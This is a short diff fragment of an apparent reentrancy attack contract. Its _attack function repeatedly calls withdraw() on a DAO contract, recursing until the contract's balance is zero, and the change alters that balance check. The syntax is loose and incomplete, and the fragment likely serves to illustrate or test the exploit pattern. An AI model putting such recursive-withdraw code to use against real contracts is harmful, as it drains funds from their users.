@@ -20,7 +20,7 @@ def _attack() -> bool:
 
     DAO(self.dao_address).withdraw()
 
-    if DAO(self.dao_address).userBalance(self.dao_address) == 0
+    if self.dao_address.balance == 0
         return True
 
     else return _attack()
